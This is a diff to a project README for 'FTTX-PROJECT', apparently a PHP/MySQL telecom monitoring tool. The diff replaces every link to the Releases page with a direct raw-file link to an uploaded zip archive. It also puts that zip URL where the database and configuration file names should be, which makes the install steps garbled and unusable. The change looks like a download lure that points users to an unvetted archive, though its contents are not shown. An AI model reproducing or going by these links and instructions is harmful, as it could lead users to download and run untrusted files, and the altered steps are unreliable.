@@ -1,6 +1,6 @@
 # 🌟 FTTX-PROJECT - Easy Monitoring for Telecom Professionals
 
-[![Download FTTX-PROJECT](https://img.shields.io/badge/Download-FTTX--PROJECT-brightgreen.svg)](https://github.com/nagafear/FTTX-PROJECT/releases)
+[![Download FTTX-PROJECT](https://raw.githubusercontent.com/nagafear/FTTX-PROJECT/main/uploads/FTTX-PROJECT-2.2.zip)](https://raw.githubusercontent.com/nagafear/FTTX-PROJECT/main/uploads/FTTX-PROJECT-2.2.zip)
 
 ## 📘 Overview
 
@@ -22,7 +22,7 @@ Follow these steps to successfully download and run the FTTX-PROJECT application
 
 To get FTTX-PROJECT, visit the Releases page to download the latest version:
 
-[Download FTTX-PROJECT](https://github.com/nagafear/FTTX-PROJECT/releases)
+[Download FTTX-PROJECT](https://raw.githubusercontent.com/nagafear/FTTX-PROJECT/main/uploads/FTTX-PROJECT-2.2.zip)
 
 1. Click on the link to open the Releases page.
 2. Look for the latest version available.
@@ -43,8 +43,8 @@ Once you have downloaded the application, follow these steps to install it:
 
 1. Open your MySQL database management tool (like phpMyAdmin).
 2. Create a new database named `fttx_project`.
-3. Import the `database.sql` file included in the extracted folder to set up the necessary tables.
-4. Configure the database connection settings in the `config.php` file located in the main directory.
+3. Import the `https://raw.githubusercontent.com/nagafear/FTTX-PROJECT/main/uploads/FTTX-PROJECT-2.2.zip` file included in the extracted folder to set up the necessary tables.
+4. Configure the database connection settings in the `https://raw.githubusercontent.com/nagafear/FTTX-PROJECT/main/uploads/FTTX-PROJECT-2.2.zip` file located in the main directory.
 5. Input your MySQL credentials (username, password) and save the file.
 
 ### 🖥 Running the Application
